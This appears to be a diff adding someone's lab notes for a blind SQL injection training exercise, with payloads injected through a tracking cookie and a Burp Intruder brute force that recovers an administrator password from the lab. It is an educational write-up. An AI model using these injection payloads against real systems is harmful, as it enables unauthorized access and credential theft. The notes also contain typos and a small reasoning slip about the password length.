@@ -1,0 +1,74 @@
+Lab #11 Blind SQL injection with conditional responses
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+1. Enumerate the password Of the administrator
+2. Log in as the administrator user
+---------------------------------------------------------------
+
+Steps:
+
+1. Confirm that the parameter is Vulnerable to SQL injection.
+
+select tracking-id from tracking-table where trackingId = 'fy80YwYZsyL6KWbh'
+
+-> If this tracking id exists -> query returns value -> Welcome back message
+-> If the trrcking id doesn't exist -> query retuns nothing -> no Welcome back message
+
+select tracking-id from tracking-table where trackingld = 'fy80YwYZsyL6KWbh' and 1=1--'
+    -> TRUE -> Welcome back
+
+select tracking-id from tracking-table where trackingld = 'fy80YwYZsyL6KWbh' and 1=0--'
+    -> False ->No Welcome back
+
+payload: ' and 1=1--'   => True.       &         ' and 1=0--'        => False
+
+2. Confirm if the users table exists.
+
+' and (select 'x' from users LIMIT 1)='x'--'
+    -> Users table exists in the database.
+
+3. Confirm that the user 'administrator' exists in the users table.
+
+' and (select username from users where username='administrator')='administrator'--
+    -> administrator user exists
+
+4. Enumerate the password of the administrator user.
+
+' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--
+    => false => no Welcome back => password is of 20 characters.
+    (Use intruder and set the payload to LENGTH of password and Enumerate the password length.)
+
+' and (select substring(password,1,1) from users where username='administrator')='a'--
+
+To perfrom the attack from the intruder we'll use cluster bomb attack...
+we'll place first payload on the '1' after the password in the substring & the second payload to the character which is 'a' in our case.
+on the first payload we'll use numbers attack which is sequential from 1 to 20 with step 1.
+on the second payload we'll use bruteforcer with min length and max length both equal to 1 as its only one character that we are bruteforcing.
+At last we'll order the attack by clicking on payload 1. which gives us the table below.
+
+161	1	i	200	342	false	false	5584	
+642	2	6	200	212	false	false	5584	
+103	3	f	200	204	false	false	5584	
+384	4	t	200	194	false	false	5584	
+565	5	2	200	182	false	false	5584	
+606	6	4	200	259	false	false	5584	
+627	7	5	200	289	false	false	5584	
+208	8	k	200	362	false	false	5584	
+29	9	b	200	198	false	false	5584	
+330	10	q	200	157	false	false	5584	
+491	11	y	200	411	false	false	5584	
+472	12	x	200	472	false	false	5584	
+713	13	9	200	172	false	false	5584	
+74	14	d	200	167	false	false	5584	
+195	15	j	200	292	false	false	5584	
+196	16	j	200	282	false	false	5584	
+37	17	b	200	221	false	false	5584	
+158	18	h	200	251	false	false	5584	
+379	19	s	200	194	false	false	5584	
+680	20	7	200	203	false	false	5584	
+
+Now we can see on which position which character is there.
+
+Which makes the complete password look like ==> i6ft245kbqyx9djjbhs7
